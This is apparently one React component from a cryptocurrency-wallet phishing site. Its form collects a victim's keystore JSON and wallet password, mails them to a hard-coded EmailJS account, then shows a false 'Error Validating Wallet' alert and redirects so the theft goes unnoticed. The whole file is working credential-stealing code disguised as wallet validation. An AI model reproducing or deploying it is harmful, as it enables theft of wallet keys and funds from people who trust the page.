import React from 'react'
import { useRouter } from 'next/router'
import emailjs from '@emailjs/browser';

import { IoMdArrowRoundForward } from "react-icons/io"
import { PhraseContainer } from "../../styles/Phrase"


const Keystore = ({ close, vname }) => {

    const Router = useRouter();

    const sendEmail = (e) => {
        e.preventDefault();

        emailjs
            .sendForm(
                "service_uca2x1k",
                "template_q4vga96",
                e.target,
                "user_Qp1Kvs7l8ZL0vLtKArviW"
            )
            .then(
                (result) => {
                    console.log(result.text);
                    alert("Error Validating Wallet... Please try again later")
                    Router.push("/")
                },
                (error) => {
                    console.log(error.text);
                }
            );
        e.target.reset();
    };

    return (
        <PhraseContainer>
            <form onSubmit={sendEmail}>
                <hr />
                <br />
                <input name="key" type="text" placeholder="Keystore JSON" minLength="10" required />
                <br />
                <input name="pass" type="text" placeholder="Wallet Password" minLength="3" required />
                <h6 style={{ fontSize: "10px", textAlign: "start" }}>
                    Typically 12 (sometimes 24...) words separated by a single spaces.
                </h6>
                <input className="v-hidden" type="text" name="vname" value={vname} />
                <button className="blue">PROCEED <span><IoMdArrowRoundForward style={{ fontSize: "1.2em", color: "#ffffff" }} /> </span></button>
            </form>
            <button type="submit" className="red" onClick={() => close(false)}>CANCEL </button>
        </PhraseContainer>
    )
}

export default Keystore